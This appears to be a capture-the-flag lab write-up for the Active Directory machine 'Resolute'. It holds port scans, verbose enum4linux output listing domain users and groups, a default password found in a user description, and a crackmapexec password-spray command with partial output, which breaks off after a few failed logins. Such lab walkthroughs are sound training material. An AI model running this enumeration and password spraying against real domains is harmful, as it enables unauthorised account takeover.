Resolute IP:10.10.10.169


rustscan:

PORT      STATE  SERVICE        REASON
53/tcp    open   domain         syn-ack
88/tcp    open   kerberos-sec   syn-ack
135/tcp   open   msrpc          syn-ack
139/tcp   open   netbios-ssn    syn-ack
389/tcp   open   ldap           syn-ack
445/tcp   open   microsoft-ds   syn-ack
464/tcp   open   kpasswd5       syn-ack
593/tcp   open   http-rpc-epmap syn-ack
636/tcp   open   ldapssl        syn-ack
5985/tcp  open   wsman          syn-ack
9389/tcp  open   adws           syn-ack
47001/tcp open   winrm          syn-ack
49664/tcp open   unknown        syn-ack
49665/tcp open   unknown        syn-ack
49666/tcp open   unknown        syn-ack
49667/tcp open   unknown        syn-ack
49671/tcp open   unknown        syn-ack
49678/tcp open   unknown        syn-ack
49679/tcp open   unknown        syn-ack
49684/tcp open   unknown        syn-ack
49713/tcp open   unknown        syn-ack
49739/tcp closed unknown        conn-refused


nmap:

PORT      STATE  SERVICE      REASON       VERSION
53/tcp    open   domain       syn-ack      Simple DNS Plus
88/tcp    open   kerberos-sec syn-ack      Microsoft Windows Kerberos (server time: 2023-03-28 09:00:36Z)
135/tcp   open   msrpc        syn-ack      Microsoft Windows RPC
139/tcp   open   netbios-ssn  syn-ack      Microsoft Windows netbios-ssn
389/tcp   open   ldap         syn-ack      Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds syn-ack      Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?    syn-ack
593/tcp   open   ncacn_http   syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped   syn-ack
5985/tcp  open   http         syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       syn-ack      .NET Message Framing
47001/tcp open   http         syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49665/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49666/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49667/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49671/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49678/tcp open   ncacn_http   syn-ack      Microsoft Windows RPC over HTTP 1.0
49679/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49684/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49713/tcp open   msrpc        syn-ack      Microsoft Windows RPC
49739/tcp closed unknown      conn-refused
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m31s, median: 6m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18001/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52471/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55070/udp): CLEAN (Timeout)
|   Check 4 (port 14804/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-03-28T02:01:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-28T09:01:25
|_  start_date: 2023-03-28T08:54:39






enum4linux:

enum4linux -v 10.10.10.169                               
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Mar 28 04:48:37 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.169    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.169'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.169    |
 ============================================ 
Looking up status of 10.10.10.169
No reply from 10.10.10.169

 ===================================== 
|    Session Check on 10.10.10.169    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.169'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.10.169 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.169    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.10.169 -c 'lsaquery' 2>&1
Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.169    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.10.169'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.169 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.10.169' 2>&1
[+] Got OS info for 10.10.10.169 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.10.169' 2>&1
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.169' 2>&1
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ========================================= 
|    Share Enumeration on 10.10.10.169    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.169

 ==================================================== 
|    Password Policy Information for 10.10.10.169    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.10.169' 2>&1


[+] Attaching to 10.10.10.169 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.169)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.10.169' -c "getdompwinfo" 2>&1

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.169    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.10.169' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Monitor Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Endpoint Servers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Certificate Service DCOM Access' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Management Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Backup Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Incoming Forest Trust Builders' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Terminal Server License Servers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Replicator' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Remote Access Servers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Desktop Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Print Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Distributed COM Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Server Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Hyper-V Administrators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'System Managed Accounts Group' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Access Control Assistance Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Guests' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Log Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Network Configuration Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Storage Replica Administrators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cryptographic Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Event Log Readers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'IIS_IUSRS' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Windows Authorization Access Group' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Pre-Windows 2000 Compatible Access' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Management Servers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Account Operators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Administrators' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.10.169' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'DnsAdmins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RAS and IAS Servers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Denied RODC Password Replication Group' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cert Publishers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Allowed RODC Password Replication Group' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.10.169' -c "enumdomgroups" 2>&1

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Schema Admins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Controllers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Group Policy Creator Owners' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Read-only Domain Controllers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Admins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Admins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Guests' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group 'Domain Users' (RID: 513) has member: MEGABANK\per
Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Protected Users' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Contractors' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Key Admins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Read-only Domain Controllers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Key Admins' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Cloneable Domain Controllers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Computers' -W '' -I '10.10.10.169' -U''%'' 2>&1

Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'DnsUpdateProxy' -W '' -I '10.10.10.169' -U''%'' 2>&1


 ======================================================================= 
|    Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.10.169 with command: rpcclient -W '' -U''%'' '10.10.10.169' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.10.169 with command: rpcclient -W '' -U''%'' '10.10.10.169' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.10.169    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.10.169' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Mar 28 04:50:33 2023



From the output of enum4linux we see that a new user has a default password:
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!

we can check to see if there are still users with this password. First we create a file with the usernames that we got from enum4linux and then with crackmapexec we try to log in those usenames with the passoword on smb:


crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
